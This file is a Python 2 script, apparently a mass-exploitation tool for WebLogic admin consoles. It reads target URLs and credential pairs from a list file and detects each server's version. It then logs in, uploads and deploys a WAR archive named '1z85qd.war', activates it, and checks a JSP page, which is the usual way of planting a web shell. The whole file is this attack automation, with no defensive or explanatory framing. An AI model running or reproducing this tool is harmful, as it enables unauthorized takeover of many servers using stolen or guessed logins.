#coding=utf-8
import re
import urllib
import requests
import Queue
import time
from bs4 import BeautifulSoup
from ver81 import ver81
from ver9000 import ver9000
from ver10330 import ver10330
from ver10300 import ver10300
from ver12000 import ver12000
'''
Copyright Dc3
https://185.es
'''

warname='1z85qd.war'
depolyname='1z85qd'
testpage='a.jsp'
count=3 #重试次数

headers = {
	'Accept-Language': 'en-US;q=0.5,en;q=0.3',
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0'
	}


def run_ver81(url,usr,pwd,count):
	run=ver81()
	if run.get_cookie(url,headers,count):
		if run.do_login(url,usr,pwd,headers,count):
			if run.get_domain_name(url,headers,count):
				if run.get_server_name(url,headers,count):
					if run.get_path(url,headers,count):
						if run.uploader(url,warname,headers,count):
							if run.depoly(url,warname,depolyname,headers,count):
								run.test(url,testpage,depolyname,count)

def run_ver10300(url,usr,pwd,count):
	run=ver10300()
	if run.do_login(url,usr,pwd,headers,count): #先登录才能得到cookie，自定义cookie无效
		if run.get_cookie(url,headers,usr,pwd,count):
			if run.get_domain_name(url,headers,count):
				if run.get_server_name(url,headers,count):
						check=run.check_active(url,headers,count)
						if check: #检查是否开启自动激活
							if run.unlock(url,headers,count):
								if run.uploader(url,warname,headers,count): #对于这个版本先上传才能获得路径
									if run.get_path(url,warname,count):
										if run.depoly(url,warname,depolyname,headers,count):
											if run.active(url,headers,count):
												if run.start_instance(url,headers,depolyname,count):
													run.test(url,depolyname,testpage,count)
						elif check == None:
							if run.uploader(url,warname,headers,count):
								if run.get_path(url,warname,count):
										if run.depoly(url,warname,depolyname,headers,count):
											run.test(url,depolyname,testpage,count)

def run_ver9000(url,usr,pwd,count):
	run=ver9000()
	if run.get_cookie(url,headers,count):
		if run.do_login(url,usr,pwd,headers,count):
			if run.get_domain_name(url,headers,count):
				if run.get_server_name(url,headers,count):
					if run.unlock(url,headers,count):
						if run.uploader(url,warname,headers,count): #对于这个版本先上传才能获得路径
							if run.get_path(url,headers,warname,count):
								if run.depoly(url,warname,depolyname,headers,count):
									if run.active(url,headers,count):
										if run.start_instance(url,headers,depolyname,count):
											run.test(url,depolyname,testpage,count)

def run_ver10330(url,usr,pwd,verse,count):
	run=ver10330()
	if run.do_login(url,usr,pwd,headers,count): #先登录才能得到cookie，自定义cookie无效
		if run.get_cookie(url,headers,usr,pwd,count):
			if run.get_domain_name(url,headers,count):
				if run.get_server_name(url,headers,count):
					if run.get_hash(url,headers,count): #获得验证hash
						check=run.check_active(count)
						if check: #检查是否开启自动激活
							if run.unlock(url,headers,count):
								if run.uploader(url,warname,headers,count): #对于这个版本先上传才能获得路径
									if run.get_path(url,warname,count):
										if run.depoly(url,warname,depolyname,headers,count):
											if run.active(url,headers,count):
												if run.start_instance(url,headers,depolyname,count):
													run.test(url,depolyname,testpage,verse,count)
						elif check == None:
							if run.uploader(url,warname,headers,count):
								if run.get_path(url,warname,count):
										if run.depoly(url,warname,depolyname,headers,count):
											run.test(url,depolyname,testpage,verse,count)
	
def run_ver12000(url,usr,pwd,verse,count):
	run=ver12000()
	if run.do_login(url,usr,pwd,headers,count): #先登录才能得到cookie，自定义cookie无效
		if run.get_cookie(url,headers,usr,pwd,count):
			if run.get_domain_name(url,headers,count):
				if run.get_server_name(url,headers,count):
					if run.get_hash(url,headers,count): #获得验证hash
						check=run.check_active(count)
						if check: #检查是否开启自动激活
							if run.unlock(url,headers,count):
								if run.uploader(url,warname,headers,count): #对于这个版本先上传才能获得路径
									if run.get_path(url,warname,count):
										if run.depoly(url,warname,depolyname,headers,count):
											if run.active(url,headers,count):
												if run.start_instance(url,headers,depolyname,count):
													run.test(url,depolyname,testpage,verse,count)
						elif check == None: #不存在自动激活
							if run.uploader(url,warname,headers,count):
								if run.get_path(url,warname,count):
										if run.depoly(url,warname,depolyname,headers,count):
											run.test(url,depolyname,testpage,verse,count)
						elif check == 000: #若管理员修改了但未保存
							print 'Pending changes exist,Unlock&Edit Skipped!\n'
							if run.uploader(url,warname,headers,count):
								if run.get_path(url,warname,count):
									if run.depoly(url,warname,depolyname,headers,count):
										if run.active(url,headers,count):
											if run.start_instance(url,headers,depolyname,count):
												run.test(url,depolyname,testpage,verse,count)
	
def get_version(url,count):
	ctest=0
	while True:
		if ctest == count:
			return False
		else:
			if ctest != 0:
				ctest+=1
				print "Retry %s times" %ctest
			else:
				ctest+=1
			try:
				html_data=requests.get(url,headers=headers,timeout=10)
				if html_data.text.count('WebLogic Server 8.1') !=0:
					ver=8
					print 'Target version is 8.1\n'
					return ver
				elif html_data.text.count('BEA WebLogic Server Administration Console') !=0:
					ver=9
					print 'Target version is 9 \n'
					return ver			
				else:
					ver_re=re.search(r'WebLogic Server Version\: [\d\.]*',html_data.text)
					if ver_re :
						ver=ver_re.group().split(' ')[3]
						print 'Target version is %s\n' %ver
						if ver.count('10.3.0.0') == 1:
							ver=10300
							return ver
						else:
							return ver
			except:
				return False

if __name__ == '__main__':
	list_data=Queue.Queue(maxsize = 0)
	for i in open("aa.txt").readlines():
		i=i.strip('\n')
		list_data.put(i)
	print 'Total URLs:%d\n' %list_data.qsize()
	time.sleep(2)
	while True:
		if list_data.qsize() != 0:
			info=list_data.get()
			url=info.split(' ')[0]
			usr=info.split(' ')[1].split('/')[0]
			pwd=info.split(' ')[1].split('/')[1]
			print 'Target:'+url+'\n'
			ver=get_version(url,count)
			if ver != None and ver != False:
				if ver == 8:
					run_ver81(url,usr,pwd,count)
				elif ver == 10300:
					run_ver10300(url,usr,pwd,count)
				elif ver == 9:
					run_ver9000(url,usr,pwd,count)
				else:
					verse=re.search(r'10.3[.\w]+',ver)
					if verse:
						run_ver10330(url,usr,pwd,verse,count)
					else:
						verse=re.search(r'12[.\w]+',ver)
						if verse:
							run_ver12000(url,usr,pwd,verse,count)
			else:
				print 'Get version error!'
				f=open('error.txt','a')
				f.write('Get version error! '+url+'\n')
				f.close()
			time.sleep(1)			
		else:
			break
